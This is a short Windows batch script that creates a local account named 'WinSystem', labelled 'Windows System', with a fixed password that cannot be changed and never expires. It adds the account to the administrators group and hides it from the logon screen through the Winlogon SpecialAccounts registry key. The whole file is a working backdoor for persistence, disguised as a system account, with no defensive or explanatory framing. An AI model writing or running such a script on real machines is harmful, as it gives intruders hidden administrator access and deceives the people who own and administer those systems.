@echo off
net user WinSystem Some-P@ssw0rd /add /fullname:"Windows System" /passwordchg:no
net localgroup administrators WinSystem /add

wmic useraccount where name='WinSystem' set passwordexpires=false
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v WinSystem /t REG_DWORD /d 0

REM Exit
exit
